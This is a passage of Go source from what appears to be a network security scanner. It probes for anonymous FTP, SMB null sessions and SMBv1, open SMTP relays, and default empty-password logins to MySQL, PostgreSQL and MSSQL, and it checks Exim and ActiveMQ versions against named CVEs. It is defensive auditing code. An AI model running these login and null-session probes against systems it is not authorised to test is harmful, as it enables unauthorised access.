	buf := make([]byte, 256)
	// Read the banner (220 reply).
	n, err := conn.Read(buf)
	if err != nil || n < 3 || string(buf[:3]) != "220" {
		return false
	}

	// Send USER anonymous.
	if _, err := fmt.Fprintf(conn, "USER anonymous\r\n"); err != nil {
		return false
	}
	conn.SetDeadline(time.Now().Add(3 * time.Second)) //nolint:errcheck
	n, err = conn.Read(buf)
	if err != nil || n < 3 {
		return false
	}
	code := string(buf[:3])
	// 331 = password required, 230 = logged in already (very permissive).
	if code != "331" && code != "230" {
		return false
	}
	if code == "230" {
		return true // Logged in without a password
	}

	// Send PASS anonymous.
	if _, err := fmt.Fprintf(conn, "PASS anonymous@beacon.test\r\n"); err != nil {
		return false
	}
	conn.SetDeadline(time.Now().Add(3 * time.Second)) //nolint:errcheck
	n, err = conn.Read(buf)
	if err != nil || n < 3 {
		return false
	}
	// 230 = login successful.
	return string(buf[:3]) == "230"
}

// ── SMB null session probe ────────────────────────────────────────────────────

// probeSMBOnPort sends an SMB Negotiate request to host:port and returns true
// when the response contains a valid SMB header (\xffSMB or \xfeSMB).
func probeSMBOnPort(ctx context.Context, host string, port int) bool {
	d := &net.Dialer{Timeout: dialTimeout}
	conn, err := d.DialContext(ctx, "tcp", net.JoinHostPort(host, strconv.Itoa(port)))
	if err != nil {
		return false
	}
	defer func() { _ = conn.Close() }()
	conn.SetDeadline(time.Now().Add(5 * time.Second)) //nolint:errcheck
	negotiate := smbNegotiatePacket()
	if _, err := conn.Write(negotiate); err != nil {
		return false
	}
	resp := make([]byte, 64)
	n, err := conn.Read(resp)
	if err != nil || n < 8 {
		return false
	}
	// \xffSMB = SMBv1, \xfeSMB = SMBv2/3 — both are valid SMB.
	if resp[5] == 0x53 && resp[6] == 0x4d && resp[7] == 0x42 {
		return resp[4] == 0xff || resp[4] == 0xfe
	}
	return false
}

// probeSMBv1OnPort connects to host:port and sends a multi-dialect SMB Negotiate
// request. Returns true when the server selects SMBv1 ("NT LM 0.12").
func probeSMBv1OnPort(ctx context.Context, host string, port int) bool {
	d := &net.Dialer{Timeout: dialTimeout}
	conn, err := d.DialContext(ctx, "tcp", net.JoinHostPort(host, strconv.Itoa(port)))
	if err != nil {
		return false
	}
	defer func() { _ = conn.Close() }()
	conn.SetDeadline(time.Now().Add(5 * time.Second)) //nolint:errcheck
	negotiate := smbNegotiatePacket()
	if _, err := conn.Write(negotiate); err != nil {
		return false
	}
	resp := make([]byte, 64)
	n, err := conn.Read(resp)
	if err != nil || n < 8 {
		return false
	}
	return resp[4] == 0xff && resp[5] == 0x53 && resp[6] == 0x4d && resp[7] == 0x42
}

// probeSMBNullSessionOnPort attempts an SMB null session on host:port.
func probeSMBNullSessionOnPort(ctx context.Context, host string, port int) bool {
	d := &net.Dialer{Timeout: dialTimeout}
	conn, err := d.DialContext(ctx, "tcp", net.JoinHostPort(host, strconv.Itoa(port)))
	if err != nil {
		return false
	}
	defer func() { _ = conn.Close() }()
	conn.SetDeadline(time.Now().Add(5 * time.Second)) //nolint:errcheck
	negotiate := smbNegotiatePacket()
	if _, err := conn.Write(negotiate); err != nil {
		return false
	}
	resp := make([]byte, 256)
	n, err := conn.Read(resp)
	if err != nil || n < 36 || string(resp[4:8]) != "\xffSMB" {
		return false
	}
	if resp[9] != 0 || resp[10] != 0 || resp[11] != 0 || resp[12] != 0 {
		return false
	}
	if _, err := conn.Write(smbNullSessionSetupPacket()); err != nil {
		return false
	}
	conn.SetDeadline(time.Now().Add(3 * time.Second)) //nolint:errcheck
	resp2 := make([]byte, 256)
	n2, err := conn.Read(resp2)
	if err != nil || n2 < 36 {
		return false
	}
	if resp2[9] != 0 || resp2[10] != 0 || resp2[11] != 0 || resp2[12] != 0 {
		return false
	}
	if n2 > 41 {
		return resp2[41]&0x01 != 0
	}
	return true
}

// smbNegotiatePacket returns the SMB multi-dialect negotiate request bytes.
func smbNegotiatePacket() []byte {
	return []byte{
		0x00, 0x00, 0x00, 0x54,
		0xff, 0x53, 0x4d, 0x42, 0x72, 0x00, 0x00, 0x00, 0x00,
		0x18, 0x01, 0x28, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0xff, 0xfe, 0x00, 0x00, 0x40, 0x00,
		0x00,
		0x26, 0x00,
		0x02, 0x4e, 0x54, 0x20, 0x4c, 0x4d, 0x20, 0x30, 0x2e, 0x31, 0x32, 0x00, // NT LM 0.12
		0x02, 0x53, 0x4d, 0x42, 0x20, 0x32, 0x2e, 0x30, 0x30, 0x32, 0x00,       // SMB 2.002
		0x02, 0x53, 0x4d, 0x42, 0x20, 0x32, 0x2e, 0x3f, 0x3f, 0x3f, 0x00,       // SMB 2.???
	}
}

// smbNullSessionSetupPacket returns the SMBv1 Session Setup AndX packet with
// null credentials (empty password, empty username).
func smbNullSessionSetupPacket() []byte {
	return []byte{
		// NetBIOS session header
		0x00,
		0x00, 0x00, 0x4a, // length: 74
		// SMB header
		0xff, 0x53, 0x4d, 0x42, // \xffSMB
		0x73,                   // command: Session Setup AndX (0x73)
		0x00, 0x00, 0x00, 0x00, // status: 0
		0x18,
		0x01, 0x20,
		0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00,
		0x00, 0x00, // TID
		0xff, 0xfe, // PID
		0x00, 0x00, // UID
		0x41, 0x00, // MID
		// Parameters (WordCount=13)
		0x0d,
		0xff,       // AndXCommand: no further commands
		0x00,       // reserved
		0x00, 0x00, // AndXOffset
		0xff, 0xff, // MaxBufferSize
		0x02, 0x00, // MaxMpxCount
		0x01, 0x00, // VcNumber
		0x00, 0x00, 0x00, 0x00, // SessionKey
		0x01, 0x00, // OEMPasswordLen: 1 (null byte)
		0x00, 0x00, // UnicodePasswordLen: 0
		0x00, 0x00, 0x00, 0x00, // reserved
		0x40, 0x00, 0x00, 0x00, // Capabilities
		// Data
		0x16, 0x00, // ByteCount: 22
		0x00,                                           // OEM password: null byte
		0x00, 0x00,                                     // Account: empty
		0x57, 0x00, 0x4f, 0x00, 0x52, 0x00, 0x4b, 0x00, // "WORKGROUP" UTF-16LE
		0x47, 0x00, 0x52, 0x00, 0x4f, 0x00, 0x55, 0x00,
		0x50, 0x00, 0x00, 0x00,
	}
}

// probeSMBv1Enabled connects to port 445 and sends a multi-dialect SMB Negotiate

func probeSMBNullSession(ctx context.Context, host string) bool {
	d := &net.Dialer{Timeout: dialTimeout}
	conn, err := d.DialContext(ctx, "tcp", fmt.Sprintf("%s:445", host))
	if err != nil {
		return false
	}
	defer func() { _ = conn.Close() }()
	conn.SetDeadline(time.Now().Add(5 * time.Second)) //nolint:errcheck

	// SMBv1 Negotiate Request — asks for NTLM dialect.
	// NetBIOS Session header (4 bytes) + SMB header (32 bytes) + Negotiate payload.
	negotiate := []byte{
		// NetBIOS session header
		0x00,       // type: Session Message
		0x00, 0x00, 0x54, // length: 84 bytes
		// SMB header
		0xff, 0x53, 0x4d, 0x42, // protocol: \xffSMB
		0x72,                   // command: Negotiate (0x72)
		0x00, 0x00, 0x00, 0x00, // status: 0
		0x18,                   // flags: caseless, canonical
		0x01, 0x28,             // flags2: Unicode, NTLM
		0x00, 0x00,             // PID high
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // signature
		0x00, 0x00,             // reserved
		0x00, 0x00,             // TID
		0xff, 0xfe,             // PID
		0x00, 0x00,             // UID
		0x40, 0x00,             // MID
		// Negotiate request parameters
		0x00,       // WordCount: 0
		0x26, 0x00, // ByteCount: 38
		// Dialects
		0x02, 0x4e, 0x54, 0x20, 0x4c, 0x4d, 0x20, 0x30, 0x2e, 0x31, 0x32, 0x00, // "NT LM 0.12"
		0x02, 0x53, 0x4d, 0x42, 0x20, 0x32, 0x2e, 0x30, 0x30, 0x32, 0x00,       // "SMB 2.002"
		0x02, 0x53, 0x4d, 0x42, 0x20, 0x32, 0x2e, 0x3f, 0x3f, 0x3f, 0x00,       // "SMB 2.???"
	}

	if _, err := conn.Write(negotiate); err != nil {
		return false
	}
	resp := make([]byte, 256)
	n, err := conn.Read(resp)
	// Valid SMB Negotiate response has \xffSMB at offset 4.
	if err != nil || n < 36 || string(resp[4:8]) != "\xffSMB" {
		return false
	}
	// Status must be 0 (success).
	if resp[9] != 0 || resp[10] != 0 || resp[11] != 0 || resp[12] != 0 {
		return false
	}

	// SMBv1 Session Setup AndX with null credentials (empty password, empty username).
	sessionSetup := []byte{
		// NetBIOS session header
		0x00,
		0x00, 0x00, 0x4a, // length: 74
		// SMB header
		0xff, 0x53, 0x4d, 0x42, // \xffSMB
		0x73,                   // command: Session Setup AndX (0x73)
		0x00, 0x00, 0x00, 0x00, // status: 0
		0x18,
		0x01, 0x20,
		0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00,
		0x00, 0x00, // TID
		0xff, 0xfe, // PID
		0x00, 0x00, // UID
		0x41, 0x00, // MID
		// Parameters (WordCount=13)
		0x0d,
		0xff,       // AndXCommand: no further commands
		0x00,       // reserved
		0x00, 0x00, // AndXOffset
		0xff, 0xff, // MaxBufferSize
		0x02, 0x00, // MaxMpxCount
		0x01, 0x00, // VcNumber
		0x00, 0x00, 0x00, 0x00, // SessionKey
		0x01, 0x00, // OEMPasswordLen: 1 (null byte)
		0x00, 0x00, // UnicodePasswordLen: 0
		0x00, 0x00, 0x00, 0x00, // reserved
		0x40, 0x00, 0x00, 0x00, // Capabilities
		// Data
		0x16, 0x00, // ByteCount: 22
		0x00,                                           // OEM password: null byte
		// Account: empty string (null terminated)
		0x00, 0x00,
		// PrimaryDomain: "WORKGROUP\0" in UTF-16LE
		0x57, 0x00, 0x4f, 0x00, 0x52, 0x00, 0x4b, 0x00,
		0x47, 0x00, 0x52, 0x00, 0x4f, 0x00, 0x55, 0x00,
		0x50, 0x00, 0x00, 0x00,
	}

	if _, err := conn.Write(sessionSetup); err != nil {
		return false
	}
	conn.SetDeadline(time.Now().Add(3 * time.Second)) //nolint:errcheck
	resp2 := make([]byte, 256)
	n2, err := conn.Read(resp2)
	if err != nil || n2 < 36 {
		return false
	}
	// Status must be 0 (NT_STATUS_SUCCESS).
	if resp2[9] != 0 || resp2[10] != 0 || resp2[11] != 0 || resp2[12] != 0 {
		return false
	}
	// Action flags at offset 41 (WordCount area of Session Setup response).
	// Bit 0 set = guest/null session accepted.
	if n2 > 41 {
		return resp2[41]&0x01 != 0
	}
	// If we got a success status with no action byte, treat as null session.
	return true
}

// ── Exim version parsing ──────────────────────────────────────────────────────

// parseEximVersion extracts the Exim version number from an SMTP banner.
// Banners look like: "220 hostname ESMTP Exim 4.89 Mon, 28 Mar 2026 ..."
// Returns empty string if not found.
func parseEximVersion(banner string) string {
	lower := strings.ToLower(banner)
	idx := strings.Index(lower, "exim ")
	if idx < 0 {
		return ""
	}
	rest := strings.TrimSpace(banner[idx+5:])
	fields := strings.Fields(rest)
	if len(fields) == 0 {
		return ""
	}
	// First token after "exim " is the version (e.g. "4.89", "4.98.1")
	v := fields[0]
	// Validate it looks like a version (starts with a digit)
	if len(v) == 0 || v[0] < '0' || v[0] > '9' {
		return ""
	}
	return v
}

// isActiveMQRCE2023Vulnerable parses the ActiveMQ version from a banner string and
// returns (true, version) when the version is vulnerable to CVE-2023-46604.
// The OpenWire binary banner contains the version string as a substring, e.g. "5.16.3".
// Vulnerable ranges: < 5.15.16, 5.16.x < 5.16.7, 5.17.x < 5.17.6, 5.18.x < 5.18.3.
func isActiveMQRCE2023Vulnerable(banner string) (bool, string) {
	// Look for a version pattern like "5.16.3" in the banner.
	var maj, min, patch int
	// Scan through the banner string for digit sequences matching x.y.z
	for i := 0; i < len(banner)-4; i++ {
		if banner[i] >= '0' && banner[i] <= '9' {
			n, err := fmt.Sscanf(banner[i:], "%d.%d.%d", &maj, &min, &patch)
			if err != nil || n != 3 {
				continue
			}
			if maj != 5 {
				continue
			}
			verStr := fmt.Sprintf("%d.%d.%d", maj, min, patch)
			switch {
			case min < 15:
				return true, verStr
			case min == 15 && patch < 16:
				return true, verStr
			case min == 16 && patch < 7:
				return true, verStr
			case min == 17 && patch < 6:
				return true, verStr
			case min == 18 && patch < 3:
				return true, verStr
			}
			return false, verStr
		}
	}
	return false, ""
}

// isEximHeapOverflowVulnerable returns true when the Exim version is before 4.90.1,
// the fix for CVE-2018-6789 (base64d() off-by-one heap overflow → pre-auth RCE).
// All Exim versions through 4.90.0 are affected; 4.90.1 contains the fix.
func isEximHeapOverflowVulnerable(ver string) bool {
	parts := strings.Split(ver, ".")
	if len(parts) < 2 {
		return false
	}
	major, minor, patch := 0, 0, 0
	_, _ = fmt.Sscanf(parts[0], "%d", &major)
	_, _ = fmt.Sscanf(parts[1], "%d", &minor)
	if len(parts) >= 3 {
		_, _ = fmt.Sscanf(parts[2], "%d", &patch)
	}
	if major != 4 {
		return false
	}
	if minor < 90 {
		return true
	}
	if minor == 90 {
		return patch < 1
	}
	return false
}

// isEximRCE2019Vulnerable returns true when the Exim version is in the range
// 4.87–4.91 vulnerable to CVE-2019-10149 (DELIVER_FAIL_STR local-part expansion RCE).
// Fixed in Exim 4.92 released 2019-06-04.
func isEximRCE2019Vulnerable(ver string) bool {
	parts := strings.Split(ver, ".")
	if len(parts) < 2 {
		return false
	}
	major, minor := 0, 0
	_, _ = fmt.Sscanf(parts[0], "%d", &major)
	_, _ = fmt.Sscanf(parts[1], "%d", &minor)
	return major == 4 && minor >= 87 && minor <= 91
}

// ── SMTP open relay probe ─────────────────────────────────────────────────────

// probeSMTPOpenRelay tests whether the SMTP server relays mail for arbitrary
// external senders to external recipients — the definition of an open relay.
// Returns true when the server accepts both MAIL FROM and RCPT TO for
// external addresses without authentication.
func probeSMTPOpenRelay(ctx context.Context, host string, port int) bool {
	d := &net.Dialer{Timeout: dialTimeout}
	conn, err := d.DialContext(ctx, "tcp", fmt.Sprintf("%s:%d", host, port))
	if err != nil {
		return false
	}
	defer func() { _ = conn.Close() }()
	conn.SetDeadline(time.Now().Add(8 * time.Second)) //nolint:errcheck

	readLine := func() string {
		buf := make([]byte, 512)
		n, _ := conn.Read(buf)
		return strings.TrimSpace(string(buf[:n]))
	}
	send := func(cmd string) string {
		conn.SetDeadline(time.Now().Add(3 * time.Second)) //nolint:errcheck
		_, _ = fmt.Fprintf(conn, "%s\r\n", cmd)                 //nolint:errcheck
		return readLine()
	}

	// Read banner.
	banner := readLine()
	if !strings.HasPrefix(banner, "220") {
		return false
	}

	// EHLO — use a plausible test domain.
	ehlo := send("EHLO beacon-relay-test.example.com")
	if !strings.HasPrefix(ehlo, "250") {
		send("HELO beacon-relay-test.example.com")
	}

	// MAIL FROM external address.
	mailFrom := send("MAIL FROM:<relay-test@beacon-probe.example.com>")
	if !strings.HasPrefix(mailFrom, "250") {
		send("RSET")
		return false
	}

	// RCPT TO a different external domain — relay if accepted.
	rcptTo := send("RCPT TO:<relay-test@beacon-probe-dest.example.com>")
	accepted := strings.HasPrefix(rcptTo, "250") || strings.HasPrefix(rcptTo, "251")

	send("RSET")
	return accepted
}

// probeHTTPBodyWithAuth makes an authenticated HTTP GET request and returns the body.
// Returns ("", false) if the response is not 200 OK.
func probeHTTPBodyWithAuth(ctx context.Context, host string, port int, useTLS bool, path, user, pass string) (string, bool) {
	scheme := "http"
	if useTLS {
		scheme = "https"
	}
	u := fmt.Sprintf("%s://%s:%d%s", scheme, host, port, path)
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, //nolint:gosec
		DialContext:     (&net.Dialer{Timeout: dialTimeout}).DialContext,
	}
	defer transport.CloseIdleConnections()
	client := &http.Client{
		Timeout:   httpTimeout,
		Transport: transport,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
	if err != nil {
		return "", false
	}
	req.SetBasicAuth(user, pass)
	resp, err := client.Do(req)
	if err != nil {
		return "", false
	}
	defer func() { _ = resp.Body.Close() }()
	if resp.StatusCode != http.StatusOK {
		return "", false
	}
	buf := make([]byte, 8192)
	n, _ := io.ReadFull(resp.Body, buf)
	return string(buf[:n]), true
}

// probeMySQL attempts a MySQL authentication handshake with user root and empty password.
// Returns true if the server responds with an OK packet (0x00 first byte after length prefix),
// indicating root access with no password is accepted.
func probeMySQL(ctx context.Context, host string, port int) bool {
	addr := fmt.Sprintf("%s:%d", host, port)
	conn, err := (&net.Dialer{Timeout: dialTimeout}).DialContext(ctx, "tcp", addr)
	if err != nil {
		return false
	}
	defer func() { _ = conn.Close() }()
	conn.SetDeadline(time.Now().Add(httpTimeout)) //nolint:errcheck

	// Read the server greeting (initial handshake packet).
	// MySQL packet format: 3-byte length (LE) + 1-byte sequence number + payload
	hdr := make([]byte, 4)
	if _, err := io.ReadFull(conn, hdr); err != nil {
		return false
	}
	pktLen := int(hdr[0]) | int(hdr[1])<<8 | int(hdr[2])<<16
	if pktLen == 0 || pktLen > (1<<24) { // MySQL max packet is 16MB
		return false
	}
	greeting := make([]byte, pktLen)
	if _, err := io.ReadFull(conn, greeting); err != nil {
		return false
	}
	// Protocol version byte: 0x0a = MySQL 4.1+, 0x09 = MySQL 3.x
	if len(greeting) < 1 || (greeting[0] != 0x0a && greeting[0] != 0x09) {
		return false
	}
	// Server capability flags are at bytes 14-15 (little-endian) in the greeting.
	// We need CLIENT_PROTOCOL_41 (0x0200) to know the auth format.
	// For simplicity, send a MySQL 4.1 client auth packet with root/empty password.
	// Parse auth plugin name from greeting to handle MySQL 8.0 caching_sha2_password.
	var authPlugin string
	if nul := bytes.IndexByte(greeting[1:], 0); nul >= 0 {
		// After version string (NUL-terminated): 4 thread_id + 8 auth_data_1 + 1 filler +
		// 2 caps_lo + 1 charset + 2 status + 2 caps_hi + 1 auth_len + 10 reserved = 31 bytes
		// then auth_data_2 (max(13, auth_len-8)) then plugin name (NUL-terminated).
		base := 1 + nul + 1 // past version string NUL
		if len(greeting) > base+31 {
			authDataLen := int(greeting[base+4+8+1+2+1+2+2])
			part2Len := authDataLen - 8
			if part2Len < 13 {
				part2Len = 13
			}
			pluginOff := base + 31 + part2Len
			if pluginOff < len(greeting) {
				if end := bytes.IndexByte(greeting[pluginOff:], 0); end >= 0 {
					authPlugin = string(greeting[pluginOff : pluginOff+end])
				}
			}
		}
	}

	// Client auth packet: capabilities(4) + max_packet(4) + charset(1) + reserved(23) + username + NUL + auth_response_length(1) + auth_response(0) [+ plugin_name]
	authPkt := make([]byte, 0, 128)
	// Capabilities: CLIENT_PROTOCOL_41 | CLIENT_LONG_PASSWORD | CLIENT_SECURE_CONNECTION | CLIENT_PLUGIN_AUTH
	caps := uint32(0x00000200 | 0x00000001 | 0x00008000 | 0x00080000)
	authPkt = append(authPkt,
		byte(caps), byte(caps>>8), byte(caps>>16), byte(caps>>24), // capabilities
		0x00, 0x00, 0x00, 0x01, // max packet size (16MB)
		0x21,                                                       // charset: utf8
		0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, // reserved (23 bytes)
	)
	authPkt = append(authPkt, []byte("root")...)
	authPkt = append(authPkt, 0x00) // NUL terminator for username
	authPkt = append(authPkt, 0x00) // auth_response_length = 0 (empty password)
	if authPlugin != "" {
		authPkt = append(authPkt, []byte(authPlugin)...)
		authPkt = append(authPkt, 0x00) // NUL terminator for plugin name
	}

	// Wrap in MySQL packet frame (length + sequence 1)
	frame := make([]byte, 4+len(authPkt))
	frame[0] = byte(len(authPkt))
	frame[1] = byte(len(authPkt) >> 8)
	frame[2] = byte(len(authPkt) >> 16)
	frame[3] = 0x01 // sequence number
	copy(frame[4:], authPkt)
	if _, err := conn.Write(frame); err != nil {
		return false
	}

	// Read response header
	respHdr := make([]byte, 4)
	if _, err := io.ReadFull(conn, respHdr); err != nil {
		return false
	}
	respLen := int(respHdr[0]) | int(respHdr[1])<<8 | int(respHdr[2])<<16
	if respLen == 0 {
		return false
	}
	respPayload := make([]byte, respLen)
	if _, err := io.ReadFull(conn, respPayload); err != nil {
		return false
	}
	// OK packet: first byte is 0x00; Error packet: first byte is 0xff
	// AuthMoreData (0x01): MySQL 8.0 caching_sha2_password sends this for
	// fast auth success — byte 1 is 0x03 (fast auth OK), followed by OK packet.
	if len(respPayload) > 0 && respPayload[0] == 0x00 {
		return true
	}
	if len(respPayload) >= 2 && respPayload[0] == 0x01 && respPayload[1] == 0x03 {
		// Fast auth success — read the following OK packet.
		okHdr := make([]byte, 4)
		if _, err := io.ReadFull(conn, okHdr); err != nil {
			return false
		}
		okLen := int(okHdr[0]) | int(okHdr[1])<<8 | int(okHdr[2])<<16
		if okLen == 0 {
			return false
		}
		okPayload := make([]byte, okLen)
		if _, err := io.ReadFull(conn, okPayload); err != nil {
			return false
		}
		return len(okPayload) > 0 && okPayload[0] == 0x00
	}
	return false
}

// probePostgreSQL attempts a PostgreSQL startup handshake as user "postgres" with no password.
// Returns true if the server responds with AuthenticationOk (message type 'R' + int32(0)),
// indicating trust authentication is configured for remote connections.
func probePostgreSQL(ctx context.Context, host string, port int) bool {
	addr := fmt.Sprintf("%s:%d", host, port)
	conn, err := (&net.Dialer{Timeout: dialTimeout}).DialContext(ctx, "tcp", addr)
	if err != nil {
		return false
	}
	defer func() { _ = conn.Close() }()
	conn.SetDeadline(time.Now().Add(httpTimeout)) //nolint:errcheck

	// PostgreSQL startup message: Int32(length) + Int32(196608 = protocol 3.0) + key=value pairs + NUL
	user := "postgres"
	database := "postgres"
	params := "user\x00" + user + "\x00database\x00" + database + "\x00\x00"
	msgLen := 4 + 4 + len(params) // length field + protocol + params
	msg := make([]byte, 4+msgLen)
	binary.BigEndian.PutUint32(msg[0:], uint32(msgLen))
	binary.BigEndian.PutUint32(msg[4:], 196608) // protocol 3.0
	copy(msg[8:], params)
	if _, err := conn.Write(msg); err != nil {
		return false
	}

	// Read response: first byte is message type
	typeBuf := make([]byte, 1)
	if _, err := io.ReadFull(conn, typeBuf); err != nil {
		return false
	}
	if typeBuf[0] != 'R' { // 'R' = Authentication message
		return false
	}
	// Read Int32 length
	lenBuf := make([]byte, 4)
	if _, err := io.ReadFull(conn, lenBuf); err != nil {
		return false
	}
	msgLength := int(binary.BigEndian.Uint32(lenBuf)) - 4 // subtract length field itself
	if msgLength < 4 {
		return false
	}
	authPayload := make([]byte, msgLength)
	if _, err := io.ReadFull(conn, authPayload); err != nil {
		return false
	}
	// AuthenticationOk: Int32(0)
	return len(authPayload) >= 4 && binary.BigEndian.Uint32(authPayload[0:]) == 0
}

// probeMSSQL attempts a minimal TDS prelogin to detect MSSQL and check if sa with empty
// password is accepted. Sends a TDS prelogin packet and reads the server response.
// An error message about login failure is still confirmation of a live MSSQL server;
// no error (successful login) indicates sa with empty password.
func probeMSSQL(ctx context.Context, host string, port int) bool {
	addr := fmt.Sprintf("%s:%d", host, port)
	conn, err := (&net.Dialer{Timeout: dialTimeout}).DialContext(ctx, "tcp", addr)
	if err != nil {
		return false
	}
	defer func() { _ = conn.Close() }()
	conn.SetDeadline(time.Now().Add(httpTimeout)) //nolint:errcheck

	// TDS 7.0 PRELOGIN packet.
	// Header: type(1)=0x12, status(1)=0x01, length(2), SPID(2)=0, PacketID(1)=1, Window(1)=0
	// Payload: VERSION token + ENCRYPTION token + terminator
	prelogin := []byte{
		0x12,       // type: PRELOGIN
		0x01,       // status: EOM
		0x00, 0x2F, // total length: 47
		0x00, 0x00, // SPID
		0x01,       // PacketID
		0x00,       // Window
		// Payload: VERSION option (0x00) at offset 0x0006, length 6
		0x00, 0x00, 0x06, 0x00, 0x06,
		// ENCRYPTION option (0x01) at offset 0x000C, length 1
		0x01, 0x00, 0x0C, 0x00, 0x01,
		// Terminator
		0xFF,
		// VERSION value: 0x0E000000 0x0000 (SQL Server 2017 = 14.0)
		0x0E, 0x00, 0x00, 0x00, 0x00, 0x00,
		// ENCRYPTION value: ENCRYPT_NOT_SUP (0x02)
		0x02,
	}
	if _, err := conn.Write(prelogin); err != nil {
		return false
	}

	respHdr := make([]byte, 8)
	if _, err := io.ReadFull(conn, respHdr); err != nil {
		return false
	}
	// TDS PRELOGIN response type = 0x04
	if respHdr[0] != 0x04 {
		return false
	}
	respLen := int(respHdr[2])<<8 | int(respHdr[3])
	if respLen <= 8 {
		return false
	}
	rest := make([]byte, respLen-8)
	if _, err := io.ReadFull(conn, rest); err != nil {
		return false
	}

	// Now send a TDS LOGIN7 packet for sa with empty password.
	// This is a simplified LOGIN7 — enough for most SQL Server versions to attempt auth.
	// The password in TDS LOGIN7 is XOR-obfuscated; empty password XOR-obfuscated = just the XOR bytes.
	// For simplicity: send a minimal login and check if the response is a LOGINACK (0xAD) or ERROR (0xAA).
	login := buildTDSLogin7("sa", "")
	if _, err := conn.Write(login); err != nil {
		return false
	}

	// Read response tokens looking for LOGINACK (success) vs ERROR (failure).
	buf := make([]byte, 4096)
	n, err := conn.Read(buf)
	if err != nil || n < 9 {
		return false
	}
	// TDS response: header (8 bytes) + token stream
	// LOGINACK token = 0xAD; ERROR token = 0xAA
	// Look for LOGINACK in the token stream.
	for i := 8; i < n; i++ {
		if buf[i] == 0xAD { // LOGINACK — login succeeded
			return true
		}
	}
	return false
}

// buildTDSLogin7 builds a minimal TDS LOGIN7 packet for sa with empty password.
func buildTDSLogin7(user, _ string) []byte {
	// Fixed-length LOGIN7 header fields (all little-endian).
	// Client name, app name, server name, library name are all minimal.
	hostname := "beacon"
	appname := "beacon"
	servername := "beacon"
	language := ""
	database := "master"

	encodeUCS2 := func(s string) []byte {
		b := make([]byte, len(s)*2)
		for i, c := range s {
			b[i*2] = byte(c)
			b[i*2+1] = 0
		}
		return b
	}

	// Offsets start after the fixed 94-byte header.
	const fixedLen = 94
	type strField struct {
		offset uint16
		length uint16
		data   []byte
	}

	hostnameData := encodeUCS2(hostname)
	usernameData := encodeUCS2(user)
	// Empty password TDS obfuscation: each byte XOR 0xA5, then nibble-swap.
	passwordData := []byte{}
	appnameData := encodeUCS2(appname)
	servernameData := encodeUCS2(servername)
	unusedData := []byte{}
	libraryData := encodeUCS2("go-tds")
	languageData := encodeUCS2(language)
	databaseData := encodeUCS2(database)

	fields := []strField{
		{data: hostnameData},
		{data: usernameData},
		{data: passwordData},
		{data: appnameData},
		{data: servernameData},
		{data: unusedData},
		{data: libraryData},
		{data: languageData},
		{data: databaseData},
	}

	// Calculate offsets.
	offset := uint16(fixedLen)
	for i := range fields {
		fields[i].offset = offset
		fields[i].length = uint16(len(fields[i].data) / 2) // length in characters
		offset += uint16(len(fields[i].data))
	}

	totalLen := int(offset)
	if totalLen+8 > 65535 { // TDS packet length field is uint16
		return nil
	}
	pkt := make([]byte, totalLen+8) // +8 for TDS header

	// TDS packet header
	pkt[0] = 0x10 // type: LOGIN7
	pkt[1] = 0x01 // status: EOM
	pkt[2] = byte((totalLen + 8) >> 8)
	pkt[3] = byte(totalLen + 8)
	pkt[4] = 0x00 // SPID
	pkt[5] = 0x00
	pkt[6] = 0x01 // PacketID
	pkt[7] = 0x00

	body := pkt[8:]
	// Total length field in LOGIN7 body
	binary.LittleEndian.PutUint32(body[0:], uint32(totalLen))
	// TDS version: 0x74000004 = SQL Server 2012
	binary.LittleEndian.PutUint32(body[4:], 0x74000004)
	// PacketSize
	binary.LittleEndian.PutUint32(body[8:], 4096)
	// ClientProgVer
	binary.LittleEndian.PutUint32(body[12:], 7)
	// ClientPID
	binary.LittleEndian.PutUint32(body[16:], 1)
	// ConnectionID
	binary.LittleEndian.PutUint32(body[20:], 0)
	// OptionFlags1: USE_DB_ON | INIT_DB_FATAL | SET_LANG_ON | SET_LANG_FATAL
	body[24] = 0x20 // ODBC flag
	body[25] = 0x00 // OptionFlags2
	body[26] = 0x00 // TypeFlags
	body[27] = 0x00 // OptionFlags3
	// ClientTimeZone, ClientLCID
	binary.LittleEndian.PutUint32(body[28:], 0)
	binary.LittleEndian.PutUint32(body[32:], 0x0409)

	// String offset table starts at byte 36.
	// Each entry: offset(2) + length(2)
	for i, f := range fields {
		base := 36 + i*4
		binary.LittleEndian.PutUint16(body[base:], f.offset)
		binary.LittleEndian.PutUint16(body[base+2:], f.length)
	}

	// ClientID (6 bytes) at offset 36+9*4 = 72
	// SSPI offset/length at 78, AttachDBFile at 82, ChangePassword at 86
	// LongSSPI at 90

	// Copy string data.
	for _, f := range fields {
		copy(body[f.offset:], f.data)
	}

	return pkt
}

// probeGRPCReflection probes a gRPC server for reflection by sending the HTTP/2
// connection preface and checking for a valid HTTP/2 SETTINGS frame response.
// Returns true if the port is serving HTTP/2 (gRPC uses HTTP/2 exclusively).
func probeGRPCReflection(ctx context.Context, host string, port int) bool {
	addr := fmt.Sprintf("%s:%d", host, port)
	conn, err := (&net.Dialer{Timeout: dialTimeout}).DialContext(ctx, "tcp", addr)
	if err != nil {
		return false
	}
	defer func() { _ = conn.Close() }()
	conn.SetDeadline(time.Now().Add(httpTimeout)) //nolint:errcheck

	// HTTP/2 connection preface: "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
	preface := []byte("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")
	// Followed by a SETTINGS frame: length(3)=0, type(1)=0x04, flags(1)=0, stream(4)=0
	settingsFrame := []byte{0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00}
	if _, err := conn.Write(append(preface, settingsFrame...)); err != nil {
		return false
	}

	// Read the server response — a valid HTTP/2 server will send a SETTINGS frame back.
	buf := make([]byte, 64)
	n, err := conn.Read(buf)
	if err != nil || n < 9 {
		return false
	}
